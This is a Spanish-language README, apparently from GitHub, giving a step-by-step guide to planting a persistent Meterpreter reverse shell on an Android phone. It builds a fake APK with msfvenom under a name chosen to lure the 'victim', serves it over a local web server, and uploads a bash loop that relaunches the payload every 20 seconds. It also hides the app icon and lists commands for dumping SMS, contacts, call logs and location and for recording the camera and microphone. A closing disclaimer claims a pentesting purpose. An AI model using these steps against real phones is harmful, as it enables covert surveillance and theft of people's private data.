# Exploit Persistente
Gu칤a para ejecutar un reverse-shell en un movil android dentro de una misma red local:
* Mediante una sesi칩n meterpreter 



# Requisitos

* [`metasploit-framework`](https://www.metasploit.com/) : Metasploit-Framework (`msfvenom` and `msfconsole`)
* [`python3`](https://www.python.org/) : Python 3.10 or Newer





# Tutorial

## Poner la m치quina a escuchar
### Mediante Metasploit-Framework 

Abrimos una terminal y ejecutamos los siguientes comandos:
```
sudo msfconsole
```
Para abrir la consola de Metasploit
```
use multi/handler
```
Seleccionamos para usar el exploit multi handler
```
set payload android/meterpreter/reverse_tcp
```
Seleccionar para usar el payload android/meterpreter/reverse_tcp
```
options
```
Miramos las opciones y los datos que tenemos que rellenar
```
set LHOST xxx.xxx.xxx.xxx
```
Aqu칤 pondremos la direcci칩n IP de la m치quina que escuchar치
```
set LPORT xxxx
```
Aqu칤 pondremos el puerto de la m치quina que escuchar치

Una vez relleno todo lo necesario, ejecutar el exploit:
```
run
```

En este punto, tenemos la m치quina escuchando y esperando a que la v칤ctima instale y ejecute la aplicaci칩n.
![image](https://user-images.githubusercontent.com/128656142/228466667-bbb73a23-d6f6-4184-b848-e03f9b6edf19.png)




## Crear el archivo persistente
### Mediante Nano u otro editor de texto

Abrimos la terminal en la misma ruta que d칩nde est치bamos antes y crearemos un archivo .sh con el siguiente contenido:
```
#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done
```



## Crear la aplicaci칩n a instalar
### Mediante msfvenom

Abrir la terminal en la misma ruta donde est치 creado el archivo persistente .sh y pegar el siguiente comando: 
```
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -o name.apk
```
Este comando, usando msfvenom, crea la aplicaci칩n (.apk) falsa que instalaremos en el movil android de la "victima".

* -p android/meterpreter/reverse_tcp : indica el payload que utilizaremos

* LHOST=xxx.xxx.xxx.xxx : indicaremos la direccion IP de la m치quina que pondremos a escuchar y hemos puesto arriba

* LPORT=xxxx : indicaremos el puerto de la m치quina que pondremos a escuchar y hemos puesto arriba

* -o name.apk : poner un nombre llamativo para la victima para incentivar la instalaci칩n 

Despu칠s de crear este archivo .apk ya tenemos todo, hay que pasarlo al movil, instalarlo y ejecutarlo.

Para poder pasarlo, una forma r치pida puede ser crear un servidor web en la ruta de la carpeta donde hemos creado todos los archivos y desde el movil acceder y descargarlo:
```
python3 -m http.server 80
```
![image](https://user-images.githubusercontent.com/128656142/228477354-f8ca37b9-cfee-47e6-91f3-90001b33e785.png)

Para acceder ponemos la direcci칩n IP de la m치quina seguida del puerto que hemos puesto, en el navegador del m칩vil: 
```
http://xxx.xxx.xxx.xxx:80/
```

# Manipulaci칩n

Si todo ha ido bien y la v칤ctima ha ejecutado la aplicacion en el movil android, habr치 hecho conexi칩n y nos saldr치 el siguiente mensaje:

![image](https://user-images.githubusercontent.com/128656142/228467144-130fe512-aa3f-4838-bb22-5120d45af6ab.png)

Una vez aqu칤, lo que nos interesa es subir el archivo persistente:
```
upload name.sh
```
![image](https://user-images.githubusercontent.com/128656142/228495366-3a042c1d-cf85-409c-90de-4cb2c00a7b55.png)

Luego ejecutamos los siguientes comandos:
```
shell
```
```
sh name.sh
```       
Con el comando shell ejecutaremos una shell mejor que la de meterpreter y podremos ejecutar el archivo .sh 

![image](https://user-images.githubusercontent.com/128656142/228472084-a1e5eab4-3436-4c90-8000-30a634a411f3.png)

Una vez ejecutado ya lo tenemos corriendo cada 20 segundos, as칤 que si perdemos la conexi칩n solo tendremos que ejecutar el exploit multi/handler y esperar como mucho 20 segundos a que se conecte de nuevo.
        
Un comando muy 칰til tambi칠n es: 
```
hide_app_icon
```
Con este comando se oculta la aplicaci칩n instalada, ya que el nombre con el que se instala es MainActivity y es dudosa.

**RECORDATORIO:   ESTE ARCHIVO PERSISTENTE SE TERMINA DE EJECUTAR CUANDO SE REINICIE EL M칍VIL DE LA V칈CTIMA, PERO SEGUIR츼 TENI칄NDOLO DESCARGADO. SOLO HAY QUE VOLVER A EJECUTAR LA APLICACI칍N MIENTRAS ESCUCHAMOS CON MULTI/HANDLER.**

**ESTE PASO, SI SE HACE EL COMANDO DE OCULTAR EL ICONO, NO SE PODR츼 HACER YA QUE NO SE VER츼 LA APLICACI칍N.**


# Estos pasos podr칤an servir para:

-   Ubuntu
-   Linux
-   Kali Linux
-   Fedora
-   Parrot Security OS
-   Windows 10/11
-   Termux (Android)
        
            
        
        
        
# Comandos que se pueden realizar
## Mediante el comando help en meterpreter
        
### Core Commands                          

    Command                     Description
    -------                     -----------
    ?                           Help menu
    background                  Backgrounds the current session
    bg                          Alias for background
    bgkill                      Kills a background meterpreter script
    bglist                      Lists running background scripts
    bgrun                       Executes a meterpreter script as a background thread                  
    channel                     Displays information or control active channels                   
    close                       Closes a channel
    detach                      Detach the meterpreter session (for http/https)                  
    disable_unicode_encoding    Disables encoding of unicode strings
    enable_unicode_encoding     Enables encoding of unicode strings
    exit                        Terminate the meterpreter session
    get_timeouts                Get the current session timeout values
    guid                        Get the session GUID
    help                        Help menu
    info                        Displays information about a Post module
    irb                         Open an interactive Ruby shell on the current session                  
    load                        Load one or more meterpreter extensions
    machine_id                  Get the MSF ID of the machine attached to the session
    pry                         Open the Pry debugger on the current session
    quit                        Terminate the meterpreter session
    read                        Reads data from a channel
    resource                    Run the commands stored in a file
    run                         Executes a meterpreter script or Post module
    secure                      (Re)Negotiate TLV packet encryption on the session                   
    sessions                    Quickly switch to another session
    set_timeouts                Set the current session timeout values
    sleep                       Force Meterpreter to go quiet, then re-establish session                  
    transport                   Manage the transport mechanisms
    use                         Deprecated alias for "load"
    uuid                        Get the UUID for the current session
    write                       Writes data to a channel


### Stdapi: File system Commands

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen                  
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


### Stdapi: Networking Commands

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a local port to a remote service
    route         View and modify the routing table


### Stdapi: System Commands


    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values                
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as 
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS
                  


### Stdapi: User interface Commands

    Command       Description
    -------       -----------
    screenshare   Watch the remote user desktop in real time             
    screenshot    Grab a screenshot of the interactive desktop
                  


### Stdapi: Webcam Commands

    Command               Description
    -------               -----------
    record_mic            Record audio from the default microphone for X seconds
    webcam_chat           Start a video chat
    webcam_list           List webcams
    webcam_snap           Take a snapshot from the specified webcam
    webcam_stream         Play a video stream from the specified webcam             


### Stdapi: Audio Output Commands

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system
                  

### Android Commands

    Command              Description
    -------              -----------
    activity_start       Start an Android activity from a Uri string
    check_root           Check if device is rooted
    dump_calllog         Get call log
    dump_contacts        Get contacts list
    dump_sms             Get sms messages
    geolocate            Get current lat-long using geolocation
    hide_app_icon        Hide the app icon from the launcher
    interval_colect      Manage interval collection capabilities          
    send_sms             Sends SMS from target session
    set_audio_mode       Set Ringer Mode
    sqlite_query         Query a SQLite database from storage
    wakelock             Enable/Disable Wakelock
    wlan_geolocate       Get current lat-long using WLAN information
   

### Application Controller Commands

    Command              Description
    -------              -----------
    app_install          Request to install apk file
    app_list             List installed apps in the device
    app_run              Start Main Activty for package name
    app_uninstall        Request to uninstall application
    


# Installing Metasploit-Framework 

#### On Linux / macOS :
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
 ```
 
or Follow this link : [Click Here](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos)

or Visit this link : [Click Here](https://www.metasploit.com/download)

#### On Windows :

Visit this link : [Click Here](https://www.metasploit.com/download)

or Follow this link : [Click Here](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#windows-anti-virus-software-flags-the-contents-of-these-packages)


# Disclaimer

* Ni el proyecto ni su desarrollador promueven ning칰n tipo de actividad ilegal y no son responsables del mal uso o da침o causado por este proyecto.
* Este proyecto tiene el 칰nico prop칩sito de realizar pruebas de penetraci칩n.
* No utilice esta herramienta en los dispositivos de otras personas sin su permiso.
* No use esta herramienta para da침ar a otros.
* Use este proyecto de manera responsable solo en sus propios dispositivos.
* Es responsabilidad del usuario final obedecer todas las leyes locales, estatales, federales e internacionales aplicables.



# Developer

<a href="https://github.com/SirChooks/">
  <img style="height:auto;" alt="" src="https://avatars.githubusercontent.com/u/128656142?v=4" width="260" height="260" class="avatar avatar-user width-full border color-bg-default"/>
</a>


**SirChooks** - [@SirChooks](https://github.com/SirChooks/)




<img style="height:auto;" alt="" src="https://avatars.githubusercontent.com/u/128656142?v=4" width="260" height="260" class="avatar avatar-user width-full border color-bg-default">




<div class="position-relative d-inline-block col-2 col-md-12 mr-3 mr-md-0 flex-shrink-0" style="z-index:4;">
        <a class="tooltipped tooltipped-s d-block" aria-label="Change your avatar" data-hydro-click="{&quot;event_type&quot;:&quot;user_profile.click&quot;,&quot;payload&quot;:{&quot;profile_user_id&quot;:128656142,&quot;target&quot;:&quot;EDIT_AVATAR&quot;,&quot;user_id&quot;:128656142,&quot;originating_url&quot;:&quot;https://github.com/SirChooks&quot;}}" data-hydro-click-hmac="24e4683e41fc8b5a0111e690bc7d37d715274ce4d838b293c5a3466c55c9ce77" href="https://github.com/account"><img style="height:auto;" alt="" src="https://avatars.githubusercontent.com/u/128656142?v=4" width="260" height="260" class="avatar avatar-user width-full border color-bg-default"></a>
      
  <div class="user-status-container position-relative hide-sm hide-md">
    
    <div class="f5 js-user-status-context user-status-circle-badge-container user-status-editable" data-url="/users/status?circle=1&amp;compact=0&amp;link_mentions=1&amp;truncate=0">
      
<div class="js-user-status-container user-status-circle-badge d-inline-block lh-condensed-ultra p-2" data-team-hovercards-enabled="">
  <details class="js-user-status-details details-reset details-overlay details-overlay-dark">
    <summary class="btn-link btn-block Link--secondary no-underline js-toggle-user-status-edit toggle-user-status-edit" data-hydro-click="{&quot;event_type&quot;:&quot;user_profile.click&quot;,&quot;payload&quot;:{&quot;profile_user_id&quot;:128656142,&quot;target&quot;:&quot;EDIT_USER_STATUS&quot;,&quot;user_id&quot;:128656142,&quot;originating_url&quot;:&quot;https://github.com/SirChooks&quot;}}" data-hydro-click-hmac="8506eab706296c00b797c2239e57dffe805d4bc6c9ea65e19a3b37d83094f6c2" role="button">
      <div class="d-flex flex-items-center flex-items-stretch">
        <div class="f6 lh-condensed user-status-header d-inline-flex user-status-emoji-only-header circle">
          <div class="user-status-emoji-container flex-shrink-0 mr-2 d-flex flex-items-center flex-justify-center ">
            <svg class="octicon octicon-smiley" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm3.82 1.636a.75.75 0 0 1 1.038.175l.007.009c.103.118.22.222.35.31.264.178.683.37 1.285.37.602 0 1.02-.192 1.285-.371.13-.088.247-.192.35-.31l.007-.008a.75.75 0 0 1 1.222.87l-.022-.015c.02.013.021.015.021.015v.001l-.001.002-.002.003-.005.007-.014.019a2.066 2.066 0 0 1-.184.213c-.16.166-.338.316-.53.445-.63.418-1.37.638-2.127.629-.946 0-1.652-.308-2.126-.63a3.331 3.331 0 0 1-.715-.657l-.014-.02-.005-.006-.002-.003v-.002h-.001l.613-.432-.614.43a.75.75 0 0 1 .183-1.044ZM12 7a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM5 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm5.25 2.25.592.416a97.71 97.71 0 0 0-.592-.416Z"></path></svg>
          </div>
        </div>
        <div class="
           ws-normal
           user-status-message-wrapper f6 min-width-0">
          <div class="css-truncate css-truncate-target width-fit color-fg-default">
              <span class="color-fg-muted">Set status</span>
          </div>
        </div>
      </div>
    </summary>
    <details-dialog class="rounded-2 anim-fade-in fast Box Box--overlay overflow-visible" role="dialog" aria-label="Edit status" tabindex="-1" aria-modal="true">
      
<!-- '"` --><!-- </textarea></xmp> --><form class="position-relative flex-auto js-user-status-form" data-turbo="false" action="/users/status?circle=1&amp;compact=0&amp;link_mentions=1&amp;truncate=0" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off"><input type="hidden" name="authenticity_token" value="z-OwI5rUao-4a3QSNXAdPoRFzEWvJL-o1uUNXhoOgV_ns8crpJao_SRnmwfaQixSjFHbbxD_PliPoubY7QPYXg">
    <div class="Box-header color-bg-subtle border-bottom p-3">
      <button class="Box-btn-octicon js-toggle-user-status-edit btn-octicon float-right" type="reset" aria-label="Close dialog" data-close-dialog="">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <h3 class="Box-title f5 text-bold color-fg-default">Edit status</h3>
    </div>
  <input type="hidden" name="emoji" class="js-user-status-emoji-field" value="">
  <input type="hidden" name="organization_id" class="js-user-status-org-id-field" value="">
  <div class="px-3 py-2 color-fg-default">
    <div class="js-characters-remaining-container position-relative mt-2">
      <div class="input-group d-table form-group my-0 js-user-status-form-group">
        <span class="input-group-button d-table-cell v-align-middle" style="width: 1%">
            <button aria-label="Choose an emoji" style="height: 32px; width: 46px;" type="button" data-view-component="true" class="js-toggle-user-status-emoji-picker btn-outline btn p-0">    <span class="js-user-status-original-emoji" hidden=""></span>
            <span class="js-user-status-custom-emoji"></span>
            <span class="js-user-status-no-emoji-icon">
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-smiley">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm3.82 1.636a.75.75 0 0 1 1.038.175l.007.009c.103.118.22.222.35.31.264.178.683.37 1.285.37.602 0 1.02-.192 1.285-.371.13-.088.247-.192.35-.31l.007-.008a.75.75 0 0 1 1.222.87l-.022-.015c.02.013.021.015.021.015v.001l-.001.002-.002.003-.005.007-.014.019a2.066 2.066 0 0 1-.184.213c-.16.166-.338.316-.53.445-.63.418-1.37.638-2.127.629-.946 0-1.652-.308-2.126-.63a3.331 3.331 0 0 1-.715-.657l-.014-.02-.005-.006-.002-.003v-.002h-.001l.613-.432-.614.43a.75.75 0 0 1 .183-1.044ZM12 7a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM5 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm5.25 2.25.592.416a97.71 97.71 0 0 0-.592-.416Z"></path>
</svg>
            </span>
</button>        </span>
        <text-expander keys=": @" data-mention-url="/autocomplete/user-suggestions" data-emoji-url="/autocomplete/emoji">
          <input type="text" autocomplete="off" data-no-org-url="/autocomplete/user-suggestions" data-org-url="/suggestions?mention_suggester=1" data-maxlength="80" class="d-table-cell width-full form-control js-user-status-message-field js-characters-remaining-field" placeholder="What's happening?" name="message" value="" aria-label="What is your current status?">
        </text-expander>
        <div class="error">Could not update your status, please try again.</div>
      </div>
      <div style="margin-left: 53px" class="my-1 text-small label-characters-remaining js-characters-remaining" data-suffix="remaining" hidden="">
        80 remaining
      </div>
    </div>
    <include-fragment loading="lazy" src="/users/status/emoji"></include-fragment>
    <div class="overflow-auto ml-n3 mr-n3 px-3 border-bottom" style="max-height: 33vh">
      <div class="user-status-suggestions js-user-status-suggestions collapsed overflow-hidden">
        <h4 class="f6 text-normal my-3">Suggestions:</h4>
        <div class="mx-3 mt-2 clearfix">
            <div class="float-left col-6">
                <button type="button" value=":palm_tree:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link Link--secondary no-underline js-predefined-user-status mb-1">
                  <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                    <g-emoji alias="palm_tree" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f334.png">游꺖</g-emoji>
                  </div>
                  <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                    On vacation
                  </div>
                </button>
                <button type="button" value=":face_with_thermometer:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link Link--secondary no-underline js-predefined-user-status mb-1">
                  <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                    <g-emoji alias="face_with_thermometer" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f912.png">游</g-emoji>
                  </div>
                  <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                    Out sick
                  </div>
                </button>
            </div>
            <div class="float-left col-6">
                <button type="button" value=":house:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link Link--secondary no-underline js-predefined-user-status mb-1">
                  <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                    <g-emoji alias="house" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3e0.png">游</g-emoji>
                  </div>
                  <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                    Working from home
                  </div>
                </button>
                <button type="button" value=":dart:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link Link--secondary no-underline js-predefined-user-status mb-1">
                  <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                    <g-emoji alias="dart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3af.png">游꿢</g-emoji>
                  </div>
                  <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                    Focusing
                  </div>
                </button>
            </div>
        </div>
      </div>
      <div class="user-status-limited-availability-container">
        <div class="form-checkbox my-0">
          <input type="checkbox" name="limited_availability" value="1" class="js-user-status-limited-availability-checkbox" data-default-message="I may be slow to respond." aria-describedby="limited-availability-help-text-truncate-false-compact-false" id="limited-availability-truncate-false-compact-false">
          <label class="d-block f5 color-fg-default mb-1" for="limited-availability-truncate-false-compact-false">
            Busy
          </label>
          <p class="note" id="limited-availability-help-text-truncate-false-compact-false">
            When others mention you, assign you, or request your review,
            GitHub will let them know that you have limited availability.
          </p>
        </div>
      </div>
    </div>
    <div class="d-inline-block f5 mr-2 pt-3 pb-2">
  <div class="d-inline-block mr-1">
    Clear status
  </div>

  <details class="js-user-status-expire-drop-down f6 dropdown details-reset details-overlay d-inline-block mr-2">
      <summary aria-haspopup="true" data-view-component="true" class="btn-sm btn v-align-baseline">    <div class="js-user-status-expiration-interval-selected d-inline-block v-align-baseline">
        Never
      </div>
      <div class="dropdown-caret"></div>
</summary>
    <ul class="dropdown-menu dropdown-menu-se pl-0 overflow-auto" style="width: 220px; max-height: 15.5em">
      <li>
        <button type="button" class="btn-link dropdown-item js-user-status-expire-button ws-normal" title="Never">
          <span class="d-inline-block text-bold mb-1">Never</span>
          <div class="f6 lh-condensed">Keep this status until you clear your status or edit your status.</div>
        </button>
      </li>
      <li class="dropdown-divider" role="none"></li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 30 minutes" value="2023-03-29T12:28:13+02:00">
            in 30 minutes
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 1 hour" value="2023-03-29T12:58:13+02:00">
            in 1 hour
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 4 hours" value="2023-03-29T15:58:13+02:00">
            in 4 hours
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="today" value="2023-03-29T23:59:59+02:00">
            today
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="this week" value="2023-04-02T23:59:59+02:00">
            this week
          </button>
        </li>
    </ul>
  </details>
  <input class="js-user-status-expiration-date-input" type="hidden" name="expires_at" value="">
</div>

    <include-fragment loading="lazy" src="/users/status/organizations"></include-fragment>
  </div>
  <div class="d-flex flex-items-center flex-justify-between p-3 border-top">
    <button type="submit" disabled="" class="width-full btn btn-primary mr-2 js-user-status-submit">
      Set status
    </button>
    <button type="button" disabled="" class="width-full js-clear-user-status-button btn ml-2 ">
      Clear status
    </button>
  </div>
</form>
    </details-dialog>
  </details>
</div>

    </div>
  </div>

    </div>



















































































